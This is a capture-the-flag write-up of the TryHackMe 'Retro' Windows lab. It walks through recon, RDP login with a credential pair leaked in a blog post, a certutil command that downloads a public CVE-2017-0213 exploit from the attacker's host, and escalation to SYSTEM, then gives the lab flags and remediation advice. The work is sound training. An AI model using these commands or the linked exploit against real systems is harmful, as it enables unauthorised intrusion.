# Write-up: Retro lab (Hard) on THM

This document is a structured security write-up based on hands-on exploitation of the **Retro** lab on TryHackMe website: https://tryhackme.com/room/retro

**Date**: January 17, 2026  
**Source**: TryHackMe — Retro & Personal Hands-On Practice

---

## Summary

The **Retro** lab features a standalone **Windows Server 2016** machine running Microsoft IIS and a WordPress instance. Initial reconnaissance revealed a blog post containing a cleartext credential pair **(wade:parzival)** intended for the user **"wade"**. These credentials were successful for the **WordPress log-in** panel, also they provided authenticated access via the **Remote Desktop Protocol** (RDP). Once local access was established, the system was identified as an unpatched version of Windows Server 2016 **(Build 14393)**. This allowed for local privilege escalation using a publicly available exploit for **CVE-2017-0213**, a logic flaw in the Windows Component Object Model (COM), ultimately granting **full SYSTEM-level authority**.

---

## Technical Overview
### 1. Discovery

By first, the regular Nmap scan:  
```bash
$ sudo nmap -sC -sV -v -Pn -p- 10.82.146.230
```

Results:  
<img width="940" height="567" alt="nmap" src="https://github.com/user-attachments/assets/b3d6eeb4-63db-43ee-86d2-be890c13b827" />

Navigate to http://10.82.146.230

<img width="1920" height="974" alt="80page" src="https://github.com/user-attachments/assets/91d0cf36-c6ea-48fb-8f2a-b93f4729ed07" />

*Nothing interesting.*

---

Fuzz it:  
```bash
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt:FUZZ -u "http://10.82.146.230/FUZZ" -ic -c
```

<img width="1583" height="599" alt="fuzz" src="https://github.com/user-attachments/assets/d3cf72c4-2ba9-42e4-a75b-3c5ca0668891" />

There's our website?

<img width="1920" height="977" alt="retro" src="https://github.com/user-attachments/assets/400207f7-1c90-4539-b69f-34ba1a080858" />

*Yep.*

---

After a few minutes of discovery found something interesting on the page **"Ready Player One"**:  
<img width="1920" height="975" alt="rpo" src="https://github.com/user-attachments/assets/007057e3-5e0f-453b-ad1e-5ba25a8526f6" />

From the discovery of this website we have the possible credentials for something:  
```text
wade:parzival
```

---

Check the **wp-login.php**:  
<img width="1920" height="974" alt="wptest" src="https://github.com/user-attachments/assets/b2257962-a153-4c72-ae3f-662da731f635" />

*Success. But we gonna try to do it another way.*

Actually, the **3389/tcp** port is RDP. Maybe the credentials also for this?

---

### 2. Penetration

Let's check the RDP:  
```bash
$ xfreerdp3 /v:10.82.146.230 /u:wade /p:parzival /cert:ignore +clipboard /dynamic-resolution
```

<img width="1920" height="1030" alt="RDP" src="https://github.com/user-attachments/assets/6a651136-6c2c-48e2-86ee-ebf7c188d08c" />

*Success.*

Read the **user.txt** on the desktop right here:  
<img width="1920" height="1031" alt="usrtxt" src="https://github.com/user-attachments/assets/541ecb8c-ba2b-40ec-9e74-a9113698a055" />

**The User Flag**:  
```text
3b99fbdc6d430bfb51c72c651a261927
```

*The User Flag in our pocket.*

---

### 3. Escalation

```shell
> systeminfo
```

<img width="836" height="533" alt="sysinfo" src="https://github.com/user-attachments/assets/673b53e9-997e-413c-ade8-43bb02119209" />

Here we go: Windows Server 2016 Standard, Build 14393 — this specific build (the "Anniversary Update" branch / version 1607) is explicitly listed as a target for **CVE-2017-0213** in Microsoft's security advisories if you are running Windows Server 2016 Build 14393 and do not have the patches from May 2017 (specifically KB4019472 or any later cumulative update).

CVE-2017-0213 works because of a logic flaw in how Windows handles communication between different programs using the **Component Object Model** (COM, a kind of handshake protocol).

---

That's meaning the next dramatic things for the server:  

Kali:  
```bash
$ python -m http.server 80
```

Target:  
```shell
> certutil -urlcache -split -f http://192.168.134.69/CVE-2017-0213.exe prvesc.exe
```

<img width="1920" height="1030" alt="exe1" src="https://github.com/user-attachments/assets/b057069d-29c7-43ec-8d6e-d4e10c89a1b4" />

https://github.com/shaheemirza/CVE-2017-0213-/blob/master/CVE-2017-0213_x64.exe

Run it:  
<img width="1920" height="1030" alt="exe2" src="https://github.com/user-attachments/assets/a62699a8-e0d9-4477-a8ad-240df8652fe8" />

We are **SYSTEM**.

<img width="1920" height="1030" alt="root" src="https://github.com/user-attachments/assets/08888194-ca62-4a1d-93db-f4b778a52a88" />

**The Root Flag**:  
```text
7958b569565d7bd88d10c6f22dic4063
```

*The Root Flag in our pocket.*

---

## Security Failures & Root Causes Classification

* **Sensitive Information Disclosure** — Cleartext Credentials in Public Content — **High** Impact — The user "wade" left sensitive credentials **(wade:parzival)** in a publicly accessible blog post **("Ready Player One")**, which served as the primary **entry point** for the attack in the two ways: the WordPress log-in page and RDP Service.
* **Vulnerable Software** — Unpatched Operating System **(CVE-2017-0213)** — **Critical** Impact — The Windows Server 2016 instance was running a **legacy build (14393)** without critical security updates, allowing any local user to bypass security boundaries and escalate to **SYSTEM** privileges.
* **Weak Access Control** — Exposed RDP Service — **Medium** Impact — The Remote Desktop Protocol (3389) was exposed directly to the internet, allowing an attacker to utilize leaked credentials for a full interactive session rather than just web-level access.
* **Broken Handshake Logic** — COM Infrastructure Flaw — **High** Impact — The underlying root cause for the privilege escalation was a flaw in how the Windows **Component Object Model** handles inter-process communication, which was not mitigated by configuration but required a vendor patch.

---

## Remediation Recommendations

* **Immediately update** the Windows Server 2016 instance to the latest cumulative update (specifically addressing KB4019472 and beyond) to mitigate known local privilege escalation exploits.
* **Educate** users and web administrators on the risks of posting sensitive information, such as passwords or "hints" within blog posts or public-facing documentation.
* **Restrict** RDP access to specific IP addresses via a firewall or require a VPN for administrative access to minimize the attack surface.
* **Force** a password reset for the user "wade" and implement a policy that prohibits the reuse of passwords across different services (WordPress and RDP).

---

## Conclusion

> The compromise of the Retro lab underscores the critical importance of both operational security and timely patch management. A single oversight — leaving credentials in a blog comment — provided the initial foothold, but it was the outdated server build that allowed a standard user to become a system administrator. This highlights that security is a multi-layered discipline; while strong passwords prevent initial entry, a hardened and patched environment is the only way to prevent a minor breach from turning into a full system takeover.

---

*Write-up compiled based on TryHackMe Retro (https://tryhackme.com/room/retro) lab.*
